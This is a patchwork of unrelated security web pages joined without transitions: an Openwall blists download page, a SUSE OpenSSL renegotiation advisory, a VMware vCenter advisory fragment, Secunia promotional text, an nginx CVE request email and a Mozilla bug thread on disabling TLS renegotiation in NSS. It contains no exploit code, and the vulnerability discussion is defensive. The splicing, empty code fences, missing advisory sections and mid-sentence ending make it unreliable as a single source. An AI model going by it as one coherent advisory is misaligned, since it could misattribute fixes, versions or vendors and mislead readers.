Both programs are written in C and are very fast.

You can view the latest <README> file,
which describes blists in more detail and provides installation instructions.
It is also included in the archive below.

Download ([release notes](/lists/announce/2017/11/19/1)):

* [blists 2.0](blists-2.0.tar.gz) and
  its [signature](blists-2.0.tar.gz.sign)* [blists 1.0](blists-1.0.tar.gz) and
    its [signature](blists-1.0.tar.gz.sign)

These files are also
[available from the Openwall file archive](https://download.openwall.net/pub/projects/blists/).
The source code of blists can be browsed on
[GitHub](https://github.com/openwall/blists) or via
[CVSweb](https://cvsweb.openwall.com/blists).

Follow [this link](/signatures/) for information on verifying the signatures.

To see blists in action, check out our
[Open Source and information security mailing list archives](https://lists.openwall.net).

blists is a registered project with
[Open Hub](https://www.openhub.net/p/blists).

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
1) Problem Description and Brief Discussion
The TLS/SSLv3 protocol as implemented in openssl prior to this update
was not able to associate already sent data to a renegotiated connection.
This allowed man-in-the-middle attackers to inject HTTP requests in a
HTTPS session without being noticed.
For example Apache's mod\_ssl was vulnerable to this kind of attack because
it uses openssl.
It is believed that this vulnerability is actively exploited in the wild to
get access to HTTPS protected web-sites.
Please note that renegotiation will be disabled for any application using
openssl by this update and may cause problems in some cases.
Additionally this attack is not limited to HTTP.
2) Solution or Work-Around
There is no work-around known. Please install the update.
Moblin packages will be released later.
3) Special Instructions and Notes
Please note that this update disables renegotiation for all applications
using openssl.
All applications using openssl need to be restarted. You can find out what
library an application uses with lsof(8) as root.
If possible restart your system.
4) Package Location and Checksums
The preferred method for installing security updates is to use the YaST
Online Update (YOU) tool. YOU detects which updates are required and
automatically performs the necessary steps to verify and install them.
Alternatively, download the update packages for your distribution manually
and verify their integrity by the methods listed in Section 6 of this
announcement. Then install the packages using the command
rpm -Fhv <file.rpm>
to apply the update, replacing <file.rpm> with the filename of the
downloaded RPM package.

6) Authenticity Verification and Additional Information
- Announcement authenticity verification:
SUSE security announcements are published via mailing lists and on Web
sites. The authenticity and integrity of a SUSE security announcement is
guaranteed by a cryptographic signature in each announcement. All SUSE
security announcements are published with a valid signature.
To verify the signature of the announcement, save it as text into a file
and run the command
gpg --verify <file>
replacing <file> with the name of the file where you saved the
announcement. The output for a valid signature looks like:
gpg: Signature made <DATE> using RSA key ID 3D25D3D9
gpg: Good signature from "SuSE Security Team <security@suse.de>"
where <DATE> is replaced by the date the document was signed.
If the security team's key is not contained in your key ring, you can
import it from the first installation CD. To import the key, use the
command
gpg --import gpg-pubkey-3d25d3d9-36e12d04.asc
- Package authenticity verification:
SUSE update packages are available on many mirror FTP servers all over the
world. While this service is considered valuable and important to the free
and open source software community, the authenticity and the integrity of
a package needs to be verified to ensure that it has not been tampered
with.
The internal rpm package signatures provide an easy way to verify the
authenticity of an RPM package. Use the command
rpm -v --checksig <file.rpm>
to verify the signature of the package, replacing <file.rpm> with the
filename of the RPM package downloaded. The package is unmodified if it
contains a valid signature from build@suse.de with the key ID 9C800ACA.
This key is automatically imported into the RPM database (on
RPMv4-based distributions) and the gpg key ring of 'root' during
installation. You can also find it on the first installation CD and at
the end of this announcement.
- SUSE runs two security mailing lists to which any interested party may
subscribe:
opensuse-security@opensuse.org
- General Linux and SUSE security discussion.
All SUSE security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security+subscribe@opensuse.org>.
opensuse-security-announce@opensuse.org
- SUSE's announce-only mailing list.
Only SUSE's security announcements are sent to this list.
To subscribe, send an e-mail to
<opensuse-security-announce+subscribe@opensuse.org>.
=====================================================================
SUSE's security contact is <security@suse.com> or <security@suse.de>.
The <security@suse.de> public key is listed below.

```
```

3. Problem Description
```
```
 a. vCenter Server and vCenter Update Manager update Microsoft
    SQL Server 2005 Express Edition to Service Pack 3
```
```
    Microsoft SQL Server 2005 Express Edition (SQL Express)
    distributed with vCenter Server 4.1 Update 1 and vCenter Update
    Manager 4.1 Update 1 is upgraded from  SQL Express Service Pack 2
    to SQL Express Service Pack 3, to address multiple security
    issues that exist in the earlier releases of Microsoft SQL Express.
```
```
    Customers using other database solutions need not update for
    these issues.
```
```
    The Common Vulnerabilities and Exposures project (cve.mitre.org)
    has assigned the names CVE-2008-5416, CVE-2008-0085, CVE-2008-0086,
    CVE-2008-0107 and CVE-2008-0106 to the issues addressed in MS SQL
    Express Service Pack 3.
```
```
    Column 4 of the following table lists the action required to
    remediate the vulnerability in each release, if a solution is
    available.
```
```

```
  * Hosted products are VMware Workstation, Player, ACE, Fusion.
```
```
 b. vCenter Apache Tomcat Management Application Credential Disclosure
```
```
    The Apache Tomcat Manager application configuration file contains
    logon credentials that can be read by unprivileged local users.
```
```
    The issue is resolved by removing the Manager application in
    vCenter 4.1 Update 1.
```
```
    If vCenter 4.1 is updated to vCenter 4.1 Update 1 the logon
    credentials are not present in the configuration file after the
    update.
```
```
    VMware would like to thank Claudio Criscione of Secure Networking
    for reporting this issue to us.
```
```
    The Common Vulnerabilities and Exposures Project (cve.mitre.org)

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

From: Craig <craig@...uarter.de>

Subject: CVEs for nginx

Hi,

are the CVEs for

1.) nginx webdav: <http://secunia.com/advisories/36818/>

2.) nginx Null Pointer dereference:
<http://sysoev.ru/nginx/patch.null.pointer.txt>

3.) nginx SSL Renegotiation: <http://sysoev.ru/nginx/patch.cve-2009-3555.txt>

I know the last one contains a CVE number, nginx uses openssl and the
patch will disable renegotiation, maybe this deserves an own CVE?

Best regards,

Craig

[Internet Draft with Proposed solution for TLS (embargoed)](attachment.cgi?id=410523) (obsolete)
— [Details](attachment.cgi?id=410523&action=edit)

This is embargoed until the author publicly releases it (soon).
The proposed short term solution (and the ONLY solution for SSL 3.0) is to
disable renegotiation (that is, a second or subsequent handshake on a
connection after a first handshake has been done). The longer term solution
proposed for TLS (SSL 3.1+) is to implement the attached extension. There's
a lot more to be said/written, but this will suffice for now.

I believe this patch disables all SSL3/TLS renegotiation. The next step is
to add the code that allows the application to set the socket options,
and/or allows the user/admin to set environment variables. That next step
will follow today's meeting.

Vulnerability description:
If an SSL3/TLS server:
1) requests or accepts mid-connection SSL/TLS session renegotiations
(full handshakes that negotiate a new SSL/TLS session after the initial
handshake on the connection has already been successfully completed), and
2) ASSUMES that the client party to whom it was talking before the
renegotiation is the same party to whom it is talking after the
renegotiation (rather than fully authenticating the parties in both
sessions), and
3) treats the encrypted data streams from the two sessions as one continuous
data stream for transaction purposes,
then it is possible for an attacker to create and use a session before
a legitimate client's session, thereby causing the attacker's data (request)
to appear to the server to be be joined (prefixed) to the legitimate
client's (victim's) data (request) lending the victim's authenticity to the
attacker's request.
This is being described by some as an SSL/TLS vulnerability, but it is
simply a mistake to take two different sessions (data streams) that have
been multiplexed together over a single connection and treat them as a
single data stream, assuming them to have a single common source.
Some applications (e.g. some https servers) allow a client to send in a
request while not authenticated, then force a renegotiation to get the
client to authenticate. They are particularly vulnerable to this. But
any server that is willing to accept a renegotiation in the middle of a
connection is vulnerable, unless it authenticates the clients of every
session, or otherwise does not treat the different sessions' data streams as
a single transaction data stream. SMTP servers that accept renegotiations
are particularly useful for attackers' nefarious purposes.
Servers that do not allow mid-connection renegotiations are not vulnerable.
Clients cannot even detect that this is happening to them until the damage
is done. This is because the SSL/TLS messages in an initial negotiation
are indistinguishable from the SSL/TLS messages in a renegotiation.
The problem is exacerbated by libraries that automate renegotiation, and
allow the local application to ignore it, so that a renegotiation can occur
without the local application even being aware of it. NSS does that. :(
Also, NSS has no way for the application to completely disable renegotiation.
These things will be fixed.
Longer term, a proposed extension to TLS will enable two TLS sessions to be
bound together cryptographically, so that it will be possible to prove (as
much as anything can be proven cryptographically) that two sessions have the
same source. That will take a few more days, I think.

Ben, There is a point, and that is, keeping this bug from becoming a discussion
group. It is essential that the people working on this bug have an uncluttered channel for communications. If this gets flooded with opinions from John Q
Public, I'll find something better to do.
Bob, Since only one of the 3 new socket options is implemented so far, and
it only partially, should I pull out the other two options, and commit the
one option that I have now? I hate to think how badly this is going to break
all.sh. Maybe it will only break the tests where selfserv has the -rr option.

I think there may be value having the options in, but not hooked up. It would at least give applications a chance to change to set them (even if they don't do anything).
RE: breaking all.sh... I think only selfserv -rrr and selfserv -rrrr would break.

untested patch v2, with API and environment variables
In lib/ssl/ssl.h:

Use "never" instead of "off" to match the symbolic name
SSL\_RENEGOTIATE\_NEVER of the default value.
>+#define SSL\_ENABLE\_SSL30\_HELLO\_XTNS 22 /\* Normally requires TLS \*/
Do you use "SSL30" instead of just "SSL3" because TLS
is technically SSL 3.1?
The SSL 3.0 protocol specification does not contain the
word "extension". Are you sure we need to add the
SSL\_ENABLE\_SSL30\_HELLO\_XTNS option?
>+/\* Values for "on" with SSL\_ENABLE\_RENEGOTIATION \*/

>+#define SSL\_RENEGOTIATE\_WITH\_XTN ((PRBool)1)

Why do you skip the value "2"?
Please document SSL\_RENEGOTIATE\_WITH\_XTN.
It seems more natural to list SSL\_RENEGOTIATE\_WITH\_XTN
after SSL\_RENEGOTIATE\_ALWAYS, because
SSL\_RENEGOTIATE\_WITH\_XTN is "always" plus "with extension".
(That ordering would match the values you used for the
environment variable below.)
In lib/ssl/sslsock.c:
>+ 0, /\* enableRenegotiation (default: never) \*/
Why don't you use the symbolic name SSL\_RENEGOTIATE\_NEVER?
>+ ev = getenv("SSLENABLERENEGOTIATION");
Can we add underscores to the environment variable names?
"SSLENABLERENEGOTIATION" is difficult to read.
>+ if (ev[0] == '0' || (ev[0] | 0x20) == 'n')

The | 0x20 can be an interview question. It's not obvious
to me at all.
The value "1" is SSL\_RENEGOTIATE\_WITH\_XTN in ssl.h, but here
it is SSL\_RENEGOTIATE\_ALWAYS.
Why isn't there an environment variable for SSL\_ENABLE\_SSL30\_HELLO\_XTNS?

I would name these three levels
SSL\_RENEGOTIATE\_NOT\_ALLOWED
SSL\_RENEGOTIATE\_ALLOWED
SSL\_RENEGOTIATE\_WITH\_XTN
because I find "renegotiate always" a little confusing.
It can be interpreted to mean "always request a renegotiation".
(I know it means "always accept a renegotiation request".)

Thanks for all the review comments, solicited and unsolicited.
I'll try to answer questions here.
>Do you use "SSL30" instead of just "SSL3" because TLS is technically SSL 3.1?
Yes. All the TLS protocols are really SSL 3.x protocols, and some people
interpret "SSL3" as "SSL 3.x".
> The SSL 3.0 protocol specification does not contain the word "extension".
In section 5.6.1.2 Client Hello, draft-freier-ssl-version3-02.txt says:
Forward compatibility note:
In the interests of forward compatibility, it is
permitted for a client hello message to include
extra data after the compression methods. This data
must be included in the handshake hashes, but must
otherwise be ignored.
> Are you sure we need to add the SSL\_ENABLE\_SSL30\_HELLO\_XTNS option?
It's arguable. If we don't, then when a server enables SSL\_REQUIRE\_SAFE\_NEGOTIATION, an SSL 3.0 client that doesn't send the
renegotiation info extension won't be able to connect to it, because today
we never send extensions with an SSL 3.0 client hello. When it becomes widespread for servers to required that, it will be the end of SSL 3.0
clients, as we know them. Maybe that's OK.
> Why do you skip the value "2"?
Because 0 and 3 represent extremes of a range of choices. Presently there's
only one other choice between them, but there might be another. The three
choices are:
0: Never renegotiate at all
1: Only renegotiate if the peer's hello bears the renegotiation info extension
3: Renegotiate without restriction, whether or not the peer's client hello
bears the renegotiation info extension (like we always did in the past).
Note that "WITH\_XTN" is not yet implemented, and at the moment is treated as
"always".
> Why don't you use the symbolic name SSL\_RENEGOTIATE\_NEVER?
Some compiler doesn't like initializing a bit field with a value cast to a
PRBool.
>The | 0x20 can be an interview question. It's not obvious to me at all.
It's tolower() in a single instruction.
For environment variable values, I used '1' and '0' as synonyms for
'on (always)' and 'off (never)' respectively.
Underscores in envariable names? Sure. I was just following the style of
the existing envariables processed in that same function. That also explains
the lack of NSS\_ prefix. If there's consensus, I'm happy to add underscores
and a prefix.
> Why isn't there an environment variable for SSL\_ENABLE\_SSL30\_HELLO\_XTNS?
Someone called me and asked me to make a patch out of what I had right then.
At present, I'm torn between people who want a patch right now ASAP to the
exclusion of ALL other work including server SNI and compression, and others
who don't see it that way.
I Should also explain to Mozilla people that, until the
SSL\_REQUIRE\_SAFE\_NEGOTIATION feature is implemented, this patch is more-or-less irrelevant to browsers. It's mostly a server-only patch until then, IMO.
So, I'm not at all sure that it should be blocking 1.9.0.anything.

Some test results.
When I did a test with selfserv with libSSL built with this patch, and -rrr
which attempts to renegotiate, selfserv got an error when it attempted to
initiate the renegotiation. The command was:
selfserv -d SERVER -n DAD -SErrrvvv -C 10 -c cinvyz -p 1443 -w test &
and the output included these lines:
selfserv: SSL version 3.1 using 128-bit RC4 with 128-bit MD5 MAC
selfserv: Server Auth: 1024-bit RSA, Key Exchange: 1024-bit RSA
selfserv: SSL\_ReHandshake returned error -12176:
Renegotiation is not allowed on this SSL socket.
Then I used selfserv from an older build of libSSL, (same command) and
tried testclnt with the new libSSL. The tstclnt command was:
tstclnt -d CLIENT -f -vvv -h DAD.client -p 1443 < stdin.txt
This time, tstclnt reported:
tstclnt: Read from server -1 bytes
tstclnt: read from socket failed: Renegotiation is not allowed on this SSL socke
t.
tstclnt: exiting with return code 1
and selfserv reported:
selfserv: SSL\_ForceHandshake returned error -5938:
Encountered end of file.
So, this seems to pass my tests.
I will produce another patch equivalent to patch v2 above except for the
requested cosmetic changes (comments, symbol names, etc.)

I removed the declaration & code for sending TLS hello extensions with SSL 3.0
from this version. If we decided we need it, we can put in in later, but I
don't want to commit to it now, especially in light of [bug 526806](/show_bug.cgi?id=526806 "RESOLVED WONTFIX - Add SSL socket option for completely disabling TLS extensions").
I also changed the code for environment variables for options.
I think this version will seem more intuitive to my reviewers. Hope so.

I had asked nelson to add an option to enable SSL3 extensions explicitly, mostly for the case that some application really wanted to implement it. I don't think the environment variable is necessary. Certainly in the security firedrill sense, it doesn't hurt to not be able to turn SSL3 extensions on since we don't already have that option.

Sounds fine given the current feed back.

> Some test results.
I've identified why we on those renegotiate tests we have enabled.
Selfserv goes to request renegotiation and the call fails. This means we don't actually implement a second handshake to get the certificate. Since we don't renegotiate, then tstclient succeeds (because selfserv is only testing the protocol, not the fact the cert was received.
If I turn on the renegotiate tests that are supposed to fail (the client can't access the client auth cert), Then I see the failure because the connection succeeds when we expected it to fail.
I believe both tests give us confidence the patch is working.
Setting the environment variable appropriately causes the tests to revert to the pre-patch behavior... I'll v3 shortly.
(Thanks nelson!).

patch v3 - with editorial changes
r=wtc.
In lib/ssl/ssl.h:
>+/\* Values for "on" with SSL\_ENABLE\_RENEGOTIATION \*/
>+#define SSL\_RENEGOTIATE\_NEVER ((PRBool)0)
>+#define SSL\_RENEGOTIATE\_REQUIRES\_XTN ((PRBool)2) /\* only when hello bears \*/
>+ /\* renegotiation\_info extension \*/
>+#define SSL\_RENEGOTIATE\_UNRESTRICTED ((PRBool)3) /\* backwards compatible \*/
Nit: I think the backwards compatible setting
(SSL\_RENEGOTIATE\_UNRESTRICTED) should have the value 1
(PR\_TRUE/always). It looks strange to have a hole in
the range of values. We don't need to use extremal
values.
You can just use your description of these three settings
in [comment 19](/show_bug.cgi?id=526689#c19 "RESOLVED FIXED - SSL3 & TLS Renegotiation Vulnerability") in ssl.h. It's much clearer:
0: Never renegotiate at all
1: Only renegotiate if the peer's hello bears the renegotiation info extension
3: Renegotiate without restriction, whether or not the peer's client hello
bears the renegotiation info extension (like we always did in the past).
SSL\_ENABLE\_RENEGOTIATION itself should also be documented.
It's not clear whether SSL\_ENABLE\_RENEGOTIATION controls
the client, the server, or both. The comment "only when
hello bears renegotiation\_info extension" suggests that
SSL\_ENABLE\_RENEGOTIATION controls the server.
In lib/ssl/ssl3con.c
> SSL3AlertDescription desc = illegal\_parameter;
> SSL3ProtocolVersion version;
>+ SSL3AlertLevel level = alert\_fatal;
Nit: list |level| right below |desc| as they're closely related.
In lib/ssl/sslimpl.h:
>+ unsigned int enableSSL30HelloXtns : 1; /\* 23 \*/
Remove this.
In lib/ssl/sslsock.c
>+#define LOWER(x) (x | 0x20) /\* cheap ToLower function ignores LOCALE \*/
This must be part of the folklore of system programmers :-)
The rest of this comment responds to previous replies.
Re: SSL30: the reason I asked about it is that "SSL3" is
widely used to mean SSL 3.0, including our own
SSL\_ENABLE\_SSL3 option.
Re: SSL\_ENABLE\_SSL30\_HELLO\_XTNS:
If an SSL 3.0 NSS client is taking the trouble to upgrade
to a new NSS release and enable the proposed
SSL\_ENABLE\_SSL30\_HELLO\_XTNS option, it might as well just
enable the SSL\_ENABLE\_TLS option.
Further, one kind of TLS-intolerant servers is those that
support TLS but not TLS extensions. Right now NSS-based
browsers (Firefox and Chrome) fall back on SSL 3.0. If
the browsers still send extensions in 3.0 client hello,
they won't be able to talk to such broken servers.

Right. the default would be as it is today. I doubt the mozilla clients would ever set that value.

I plan to commit this shortly, given the r+ and sr+ on patch v3.
I now see that I also need to enhance the ssl test programs with
command line options to test the new socket options. This will
let us test clients with renegotiation disabled against servers
with it enabled, etc.
Wan-Teh, have a look at

www.mozilla.org now uses SVN. You can find the SVN instructions
if you click the "Edit this Page" link at the bottom of those pages.
It's very simple -- I have made several changes by using just the
"svn co" and "svn ci" commands in the instructions (and "svn diff").
In any case, I added the SSL error codes from
SSL\_ERROR\_SERVER\_CACHE\_NOT\_CONFIGURED to
SSL\_ERROR\_RX\_MALFORMED\_NEW\_SESSION\_TICKET to that page on Saturday.
The reason I didn't do that on Friday night was that the SSL errors
are documented in categories, so it's more work to find the right
category for each new error code.

Indeed, the commands for basic checkout/check-in are almost the same as CVS. If you have any questions about SVN or how www.mozilla.org now works, feel free to contact me OOB.

The renegotiation info extension must be issued an official extension number
by the IANA before it can be put into released products. That MAY happen
this week in Hiroshima, or may happen later this month. In the meantime,
the best we can do is disable renegotiation, which primarily helps in servers,
but when deployed in servers, benefits both servers and clients. That's what
the presently committed patch does. It's being tested now, and could be
released and CVS tagged this week.
I hope to soon have a patch that implements the renegotiation info extension
using an unofficial (experimental) extension number, for testing purposes,
while we wait for the official number to be issued.

Can we do this work in a separate bug, keeping this one just for disabling renegotiation? Thanks.

> renegotiation?
Sure. I don't know how/why any of this matters to or helps Mozilla, since
the patch in 3.12.5 is essentially for servers (and AFAIK, Mozilla doesn't
make any of those) but if it does, go for it.
Testing of 3.12.5 continues.
To summarize: In NSS 3.12.5, all SSL3/TLS renegotiation is disabled by
default, and if someone is desperate to turn it back on, and is willing
to accept the risk of the vulnerability, they can do so by setting the
environment variable NSS\_SSL\_ENABLE\_RENEGOTIATION to the string "1".
In NSS 3.12.6, we will re-enable renegotiation for TLS only, not for SSL 3.0
but only for use between clients and servers that both support the new
renegotiation\_info extension. Clients will have the option to choose to
connect ONLY to TLS servers that support that extension, if they wish.
Doing so will (finally!) render them utterly invulnerable to this attack,
at the cost of rendering them non-interoperable with all SSL 3.0 servers.

This patch is intended to give a taste of things to come.
It uses the experimental extension number, which is one reason why it
cannot be committed to a released product.
I'm pretty sure there's a nasty bug in the sending of alerts from
extension handlers, and fixing it will necessitate changing all the
extension handlers a bit.
I'm not actively seeking review, but will accept review comments.

Here's a status update. The Internet Draft attached above is ambiguous.
There are (at least) two different understandings of it that have led to
two different sets of non-interoperable implementations. I have a working implementation of one of those interpretations.
I hope that this will be resolved within 24 hours, but ...
Alert issues still need ironing out.

Re: default value for SSL\_ENABLE\_RENEGOTIATION
Nelson, turning off renegotiation for SSL clients by default
won't help servers prevent this vulnerability, so the current
default value of SSL\_RENEGOTIATE\_NEVER seems inappropriate
for SSL clients. NSS-based browsers such as Firefox and
Chrome will need to set the SSL\_ENABLE\_RENEGOTIATION option
to SSL\_RENEGOTIATE\_UNRESTRICTED when they upgrade to
NSS 3.12.5.
Can the default value of an SSL option differ between clients
and servers? I looked at the code in sslsock.c briefly, and
it seems hard. An alternative is to add a new
SSL\_RENEGOTIATE\_SERVER\_NEVER value that turns off renegotiation
only for SSL server sockets. What do you think?

Wan-Teh,
As I think you know, SSL3/TLS renegotiations, as presently defined, are unsafe.
When a client connects to and interoperates with a server that performs them,
the client is potentially vulnerable. A client who does not perform them may
experience interoperability problems with a server that does. This alerts
the client to the fact that it/he/she is connected to a server that is
potentially vulnerable, and that it/he/she becomes/remains vulnerable by
continuing to attempt to interoperate with that vulnerable server.
A client who does continue to perform unsafe renegotiations merely remains
blissfully ignorant of its vulnerability. Is that the desired goal?

Attached patch

[tested, interoperable client side safe renegotiation patch, not for review](attachment.cgi?id=412101&action=diff)
— [Details](attachment.cgi?id=412101&action=edit)
— [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=526689&attachment=412101)

In the IETF TLS working group meeting last night, the ambiguity in the spec
was resolved. Today I changed my implementation to match the resolved spec.
When tested in a client, this patch interoperates with two other server
implementations of the new safe renegotiation TLS extension.
I have more testing to do on the server side. I expect there's more work
to be done there.

In NSS 3.12.5 where SSL\_ENABLE\_RENEGOTIATION is the only
defense available, I think SSL\_RENEGOTIATE\_SERVER\_NEVER
is the right default value for SSL\_ENABLE\_RENEGOTIATION.
In NSS 3.12.6, which has the safe negotiation extension,
I think SL\_RENEGOTIATE\_WITH\_XTN is the right default
value for SSL\_ENABLE\_RENEGOTIATION.
It should be clear that any general-purpose web browser
that upgrades to NSS 3.12.5 (as opposed to NSS 3.12.6)
must set SSL\_ENABLE\_RENEGOTIATION to
SSL\_RENEGOTIATE\_UNRESTRICTED if SSL\_RENEGOTIATE\_NEVER
is the default value.

I'm not yet convinced. I've recently seen some statistics on renegotiation
that are startlingly low. I'll bet the average FF user (or Chromium user)
could run with renegotiation disabled and never know the difference.

I meant to add that I intend to start running my own browser with 3.12.5,
even though my own use of SSL/TLS is likely to be far above average, just
to test my hypothesis.

There are three URLs in
<http://code.google.com/p/chromium/issues/detail?id=6893#c18>
that do SSL client auth during renegotiation.
If SSL client auth during renegotiation were very uncommon,
Marsh Ray would probably not have discovered this SSL protocol
flaw.

I predict that, within ~90 days, a very large percentage of the servers that
now rely on renegotiation to trigger client auth will have switched to the
alternate port method (server on alternate port requests client on initial
handshake) which is safe with SSL 3.0 clients and works with clients that
do no renegotiation.

Would you accept the name SSL\_RENEGOTIATE\_CLIENT instead of
SSL\_RENEGOTIATE\_SERVER\_NEVER? I want the name to answer the question:
When (under what circumstances) will this socket renegotiate?

The name of the new SSL\_RENEGOTIATE\_xxx constant is less
important to me than choosing an approriate default for
SSL clients. I suggested SSL\_RENEGOTIATE\_SERVER\_NEVER
because it's similar to SSL\_RENEGOTIATE\_NEVER and one
can interpret it to mean "NEVER" restricted to "SERVER".
Along that line SSL\_RENEGOTIATE\_CLIENT\_UNRESTRICTED would
be also a good name.

Wan-Teh, I thought about your suggestion some more, and decide that if you
really want to impose separate rules on clients and servers, then we should
have separate options for clients and servers, rather than a single option
that attempts to set the rules for both. You might want "client unrestricted"
to be coupled with "server never" or with "server only with extension", for
example.
Johnathan & Wan-Teh, I want to ask you to speak for your respective browsers
as to how you plan to claim to have addressed the renegotiation vulnerability
for browser users. I know what features we're planning to offer in NSS,
and the default values we plan to set for those features. I do not know what
your respective browsers intend to do with those features, or when.
I believe the entire TLS developer community agrees that a client is safe
when it KNOWS that it is only attempting to initiate SSL/TLS handshakes with
servers that do not perform renegotiations, either (a) at all, ever, or
(b) except in the presence of the renegotiation\_info extensions.
There are several ways that a client have have that knowledge.
1) The client can send a renegotiation\_info in the initial handshake, when
negotiating TLS, and look for that extension in the reply from the server.
A successful initial handshake done this way assures the client that the
server implements the renegotiation\_info extension. This only works for TLS,
not for SSL 3.0. A client might choose to disconnect, rather than complete
a handshake, if the server's response lacked this extension. NSS will support
that mode of operation in NSS 3.12.6.
2) The client can have a whitelist of SSL 3.0 (and/or TLS) servers that are
known NOT to support unsafe renegotiation, and can allow SSL 3.0 handshakes
with those servers. This whitelist could be built up by any of several means
including;
a) automatic update from a service (just as google)
b) manual entry by the user himself
c) special testing transactions that could be implemented in the browser to
make this determination, recording the results in the whitelist when appropriate.
My questions for you are:
- At what point do you think your browser will stop supporting renegotiation
with vulnerable servers (servers that do renegotiation, and do not require
the renegotiation\_info extension as a condition of renegotiation)?
- At what point, if ever, do you see your browser implementing the whitelist
of servers that are safe to use, because they are known to NOT support
renegotiation, even though they do not support the renegotiation\_info
extension? (This would not be an NSS feature.)
- At what point, if ever, do you see your browser requiring that a server
either (a) be on that whitelist, or (b) use TLS and correctly implement the
renegotiation\_info extension in the initial handshake, as a condition of
completing an initial handshake with that server?
- Do you understand how to safely probe a server with NSS to see if it
supports unsafe renegotiation, for purposes of building a whitelist?

|  | |

Additional question for browsers that support a "TLS-intolerant server
fallback to SSL v3" algorithm:
- do you plan to change/reimplement that feature due to this vulnerability?
- If so, how?
One could well imagine that this feature would become integrated with the
whitelist discussed above, and that communication with pure SSL 3.0
servers would henceforth require them to be on the whitelist.
I presume the whitelist would be persistent. When a server name appears in
the whitelist, will you also record there that it is believed to be TLS
intolerant (if it is), so that henceforth you will not attempt to connect
to that server with TLS? Will you periodically re-test servers on the
whitelist to see if they are still TLS intolerant, and or still fail to
support the renegotiation\_info extension?

Yet another question for browsers that use NSS. I have been presuming that
I know the answer to this question, but others have expressed serious doubt
that my presumption is correct, so I wish to ask outright.
When you are faced with the choice of
a) disabling renegotiation with servers that are not known to be able to do
it in an invulnerable manner, but thereby breaking interoperability with some
unknown number of vulnerable servers that depend on renegotiation, and
b) continuing to allow renegotiation with vulnerable servers, and hence having
your clients and their users remain vulnerable themselves,
which will you choose?

The Renegotiation Info extension draft is getting a huge amount of discussion
in the IETF TLS working group mailing list. Lots of alternatives are being
proposed, none of which seem to be gaining large consensus (IMO).
One change to the RI proposal that does seem to be gaining consensus is that
the client should ONLY send that extension in its initial handshake on a
connection IF that client would abort the connection in the event that the
server's hello response did not include the RI. IOW, don't send RI unless
you intend to require RI.
This is a change from what is presently implemented in [attachment 412101](/attachment.cgi?id=412101 "tested, interoperable client side safe renegotiation patch, not for review") [[details]](/attachment.cgi?id=412101&action=edit "tested, interoperable client side safe renegotiation patch, not for review") [[diff]](/attachment.cgi?id=412101&action=diff "tested, interoperable client side safe renegotiation patch, not for review") [[review]](/page.cgi?id=splinter.html&ignore=&bug=526689&attachment=412101)
which always sends the RI extension in a TLS client hello, whether RI is
required in the response or not. It also means that servers \*CANNOT\*
require RI in the initial client hello on a connection, which the patch in
[attachment 412101](/attachment.cgi?id=412101 "tested, interoperable client side safe renegotiation patch, not for review") [[details]](/attachment.cgi?id=412101&action=edit "tested, interoperable client side safe renegotiation patch, not for review") [[diff]](/attachment.cgi?id=412101&action=diff "tested, interoperable client side safe renegotiation patch, not for review") [[review]](/page.cgi?id=splinter.html&ignore=&bug=526689&attachment=412101) does optionally, and one vendor's present implementation
does unconditionally.
So, this solution continues to evolve. Meanwhile, live exploits are now
being reported in the popular media.

I can't answer this question because I disagree with
the validity of choice b). Disallowing renegotiation
in a browser won't help because it is the attacker
that performs renegotiation. I know you think that
by turning off renegotiation, a browser can discover
the vulnerable servers. But you can only discover
servers that request renegotiation this way. You
can't discover servers that respond to client-initiated
renegotiation, unless the browser probes each server
it talks to with an unsolicited renegotiation client
hello. For example, I don't think twitter servers
request renegotiation.

Wan-Teh,
I see I made a consistent error when typing my question in [comment 58](/show_bug.cgi?id=526689#c58 "RESOLVED FIXED - SSL3 & TLS Renegotiation Vulnerability").
I meant to ask about disabling of "initial negotiation" with servers that
are not known to be invulnerable the renegotiation attacks, but instead
I asked about disabling renegotiation. Please re-read that question in
that light, and answer it in that light.
Also, please address my questions in comments 56 and 57, especially about
whether you want separate settable options for clients and servers.

Wan-Teh, In reply to [comment 61](/show_bug.cgi?id=526689#c61 "RESOLVED FIXED - SSL3 & TLS Renegotiation Vulnerability"), there is a renegotiation attach that is the
mirror image of the most well known one. In it, the attacker negotiates
first with the victim client, then does a renegotiation with the victim
client, causing that client to handshake with the victim server. This is
thought to be only possible if the attacker has a wildcard cert for the
victim server's domain, or controls one of N servers named on a cert with
multiple subject alternative names, and so you may regard it to be outside
your threat model, but it is nonetheless an attack which safe renegotiation
will overcome, provided that clients do not do renegotiations in a vulnerable
way.

Nelson, reading your last comments, I think this bug is starting to look more and more like a discussion/a debate, that should take place on mozilla.dev.tech.crypto instead. I have my own point to add to it, I'd like to try to show the position of people running web servers that use client authentication.
Don't you agree with that ?

There's really no debate here. NSS is going to do what it's going to do.
It will make changes to the default behavior so that the default behavior
